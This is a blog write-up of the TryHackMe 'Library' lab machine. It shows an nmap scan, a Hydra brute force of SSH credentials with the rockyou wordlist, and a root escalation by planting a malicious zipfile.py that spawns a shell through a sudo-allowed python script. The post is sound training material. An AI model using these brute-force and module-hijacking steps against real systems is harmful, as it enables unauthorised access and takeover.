<!doctype html><html lang=en>
<head>
<title>
Library - Write Up ::
Lanfran02 - Blog — Where write-ups are made.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Level Creator     Here Easy stuxnet    Reconn Using nmap we get the open ports of the machine
╰─ lanfran@parrot ❯ map 10.10.70.175 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 14:10 CEST Nmap scan report for 10.10.70.175 Host is up (0.056s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/posts/library/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/posts/library/cover.jpeg">
<meta name=twitter:title content="Library - Write Up">
<meta name=twitter:description content="TryHackMe's easy level machine.">
<meta property="og:title" content="Library - Write Up">
<meta property="og:description" content="TryHackMe's easy level machine.">
<meta property="og:type" content="article">
<meta property="og:url" content="/posts/library/"><meta property="og:image" content="/posts/library/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-04T14:07:30+02:00">
<meta property="article:modified_time" content="2021-07-04T14:07:30+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Library - Write Up</h1>
<div class=post-meta>
<span class=post-date>
2021-07-04
</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 3 min read</span>
</div>
<span class=post-tags>
<a href=/tags/hydra/>#hydra</a>&nbsp;
<a href=/tags/python/>#python</a>&nbsp;
<a href=/tags/path/>#PATH</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/posts/library/cover.jpeg alt="Library - Write Up">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconn>Reconn</a></li>
<li><a href=#foothold---user>Foothold - User</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Level</th>
<th>Creator</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/bsidesgtlibrary>Here</a></td>
<td>Easy</td>
<td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td>
</tr>
</tbody>
</table>
<h2 id=reconn>Reconn</h2>
<p>Using <code>nmap</code> we get the open ports of the machine</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.70.175                                                                                               ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-04 14:10 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.70.175
Host is up <span style=color:#f92672>(</span>0.056s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
| http-robots.txt: <span style=color:#ae81ff>1</span> disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 42.75 seconds
</code></pre></div><p>So let&rsquo;s go to the webpage on the port 80.</p>
<p>It&rsquo;s a pretty simple page, but if we are a little smart, we can get 4 users!</p>
<ul>
<li>www-data</li>
<li>root</li>
<li>meliodas</li>
<li>anonymous</li>
</ul>
<p>Also, if we go to the <code>robots.txt</code> file, we get a hint &ldquo;rockyou&rdquo;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl 10.10.70.175/robots.txt                                                                                   ─╯
User-agent: rockyou 
Disallow: /%  
</code></pre></div><p>Maybe if we try to bruteforce with <code>hydra</code> the SSH login of an user with the rockyou wordlist?</p>
<p>Let&rsquo;s try it!</p>
<h2 id=foothold---user>Foothold - User</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.70.175                                        ─╯
Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.

Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2021-06-22 21:56:53
<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://10.10.70.175:22/
^V<span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 97.00 tries/min, <span style=color:#ae81ff>97</span> tries in 00:01h, <span style=color:#ae81ff>14344303</span> to <span style=color:#66d9ef>do</span> in 2464:40h, <span style=color:#ae81ff>16</span> active
<span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 10.10.70.175   login: meliodas   password: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</code></pre></div><p>YES! It worked!</p>
<p>So let&rsquo;s use the password of meliodas and login to the SSH!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh meliodas@10.10.70.175                                                                                      ─╯
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
meliodas@ubuntu:~$ ls -la
total <span style=color:#ae81ff>40</span>
drwxr-xr-x <span style=color:#ae81ff>4</span> meliodas meliodas <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2019</span> .
drwxr-xr-x <span style=color:#ae81ff>3</span> root     root     <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> ..
-rw-r--r-- <span style=color:#ae81ff>1</span> root     root      <span style=color:#ae81ff>353</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> bak.py
-rw------- <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>44</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .bash_history
-rw-r--r-- <span style=color:#ae81ff>1</span> meliodas meliodas  <span style=color:#ae81ff>220</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> meliodas meliodas <span style=color:#ae81ff>3771</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .bashrc
drwx------ <span style=color:#ae81ff>2</span> meliodas meliodas <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .cache
drwxrwxr-x <span style=color:#ae81ff>2</span> meliodas meliodas <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .nano
-rw-r--r-- <span style=color:#ae81ff>1</span> meliodas meliodas  <span style=color:#ae81ff>655</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .profile
-rw-r--r-- <span style=color:#ae81ff>1</span> meliodas meliodas    <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> .sudo_as_admin_successful
-rw-rw-r-- <span style=color:#ae81ff>1</span> meliodas meliodas   <span style=color:#ae81ff>33</span> Aug <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2019</span> user.txt
meliodas@ubuntu:~$ cat user.txt 
6<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>c
</code></pre></div><p>We get the user&rsquo;s flag</p>
<h2 id=root>Root</h2>
<p>First let&rsquo;s run <code>sudo -l</code> to see if the user is inside the sudoers.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>meliodas@ubuntu:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> meliodas on ubuntu:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User meliodas may run the following commands on ubuntu:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
</code></pre></div><p>Yes, we can run a file with <code>/usr/bin/python*</code> and with sudo!</p>
<p>Reading the file <code>bak.py</code> we can see that it&rsquo;s using a library called &ldquo;zipfile&rdquo; and the $PATH is set to first check the home directory.
So we can exploit this, and create a malicious &ldquo;lib&rdquo; in the home directory.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>meliodas@ubuntu:~$ cat bak.py 
<span style=color:#75715e>#!/usr/bin/env python</span>
import os
import zipfile

def zipdir<span style=color:#f92672>(</span>path, ziph<span style=color:#f92672>)</span>:
    <span style=color:#66d9ef>for</span> root, dirs, files in os.walk<span style=color:#f92672>(</span>path<span style=color:#f92672>)</span>:
        <span style=color:#66d9ef>for</span> file in files:
            ziph.write<span style=color:#f92672>(</span>os.path.join<span style=color:#f92672>(</span>root, file<span style=color:#f92672>))</span>

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
    zipf <span style=color:#f92672>=</span> zipfile.ZipFile<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/var/backups/website.zip&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>, zipfile.ZIP_DEFLATED<span style=color:#f92672>)</span>
    zipdir<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/var/www/html&#39;</span>, zipf<span style=color:#f92672>)</span>
    zipf.close<span style=color:#f92672>()</span>
meliodas@ubuntu:~$ echo $PATH
/home/meliodas/bin:/home/meliodas/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
meliodas@ubuntu:~$ echo <span style=color:#e6db74>&#39;import os; os.system(&#34;/bin/sh&#34;)&#39;</span> &gt; zipfile.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
<span style=color:#75715e># cat /root/root.txt	</span>
e<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span><span style=color:#ae81ff>7</span>
</code></pre></div><p>And we rooted the machine!</p>
<p>That&rsquo;s all from my side, hope you find this helpful!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/posts/jack-of-all-trades/>
<span class=button__icon>←</span>
<span class=button__text>Jack of All Trades - Write Up</span>
</a>
</span>
<span class="button next">
<a href=/posts/thompson/>
<span class=button__text>Thompson - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
<div id=hyvor-talk-view></div>
<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>